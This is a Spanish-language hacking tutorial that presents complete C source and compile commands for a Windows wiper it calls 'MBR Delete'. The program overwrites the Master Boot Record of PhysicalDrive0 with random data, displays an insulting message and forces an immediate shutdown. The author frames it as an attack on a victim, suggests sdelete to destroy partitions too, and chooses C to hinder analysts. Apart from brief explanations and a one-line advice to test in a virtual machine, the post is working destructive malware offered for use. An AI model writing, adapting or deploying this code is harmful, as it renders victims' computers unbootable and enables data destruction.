
Que tal Haxxors, hoy vamos ha realizar un pequeño Malware para ataques disruptivos, el cual lograra afectar la disponibilidad del sistema victima. Vamos a programar nuestro MBR Delete, un pequeño Malware el cual borra el Master Boot Record (MBR) de nuestro disco dejando a nuestra victima sin poder arrancar su sistema operativo, ojo esto no borra el sistema operativo si no borrar una pequeña parte del disco en donde se encuentra el encargado de correr el sistema operativo.

## ¿Que es el Master Boot Record?

Es la primera partición del disco duro (sector 0) encargado de arrancar el sistema operativo, este pequeño sector del disco solo tiene 512 Bytes de tamaño, pero es muy importante para nuestro sistema ya que sin el quedaríamos viendo una pantalla negra con un mensaje de error.

<a href="https://ibb.co/6fTYDh7"><img src="https://i.ibb.co/n5YrQ2N/error-master-boot-corruption.png" alt="error-master-boot-corruption" border="0"></a>

Aclarar que con este método solo lograremos sobrescribir el MBR con datos aleatorios, no borraremos las particiones, una persona con conocimientos en informática lograra recuperar el sistema mediante un USB con algún sistema dentro.

Para hacer mas destructivo nuestro Malware podemos borrar las otras particiones usando algunas técnicas o con software de terceros como sdelete.exe u otros, pero en este caso solo dejaremos inoperable el sistema victima.
## Empecemos

Vamos a usar C para realizar la operación, pero podemos realizar usando C#, Python u otros lenguajes, pero en lo personal decidí usar C/C++ a que este lenguaje resulta ser mucho mas rápido y dificulta el análisis por parte de los analistas.

**Importación de librerías**

```c++
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <time.h>
#include <mem.h>

#define ID_MANIFEST 1
#ifndef RT_MANIFEST

#define RT_MANIFEST MAKEINTRESOURCE(24)
#endif
```

## Funciones encargadas de generar valores alfanuméricos

```c++
//Encargado de generar valores alfanumericos
char* rand_string(char* resultString, size_t length){
	static char charset[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
	
	if (length) {
		for (int i = 1; i < length; i++){
			int position = rand() % (int)(sizeof(charset) - 1);
			resultString[i] = charset[position];
		}
	}
	
	return resultString;
}

char* rand_string_alloc(size_t size){
	char *s = (char*) malloc(size + 1);
	
	if (s) {
		rand_string(s, size);
	}
	
	return s;
}
```

## Función principal

```c++
int main() {
	// Sobre escribiendo el MBR, Booom!!!
	HANDLE handleMBR = CreateFile("\\\\.\\PhysicalDrive0", GENERIC_ALL,
	FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING,
	FILE_ATTRIBUTE_SYSTEM, NULL);
	
	LPCVOID lpBuffer = rand_string_alloc(512);
	BOOL isSuccess = WriteFile(handleMBR, lpBuffer, 512, NULL, NULL);
	CloseHandle(handleMBR);
	
	free((void*) lpBuffer); // Limpia tu basura antes de salir!! :)
	
	if (isSuccess){
		int msgboxID = MessageBox(NULL,(LPCSTR) "I fucked u system, bitch!!!",(LPCSTR) "F*CK SEC", MB_OK | MB_ICONEXCLAMATION);
		// Apagando el sistema
		system("shutdown /S /T 0 /F")
	}
	return 0;
}
```

## Compilación de código

Yo me encuentro en mi querido sistema Debian, por lo tanto voy a usar el compilador i686-w64-mingw32-gcc para generar mi binario .exe, si tu no lo tienes instalado puedes instalarlo usando el comando...

```bash
sudo apt install -y i686-w64-mingw32-gc
```

Para la compilación solo basta tipear...

```bash
i686-w64-mingw32-gcc -o mrbdelete.exe malcode.c
```

## Ejecutamos nuestro pequeño binario

Para la prueba de nuestro binario vamos a usar una maquina virtual con Windows 10 y con el jodido defender activado.

Recomiendo probar todos sus Malwares dentro de habientes totalmente controlados, ya que estos programas son altamente destructivos.
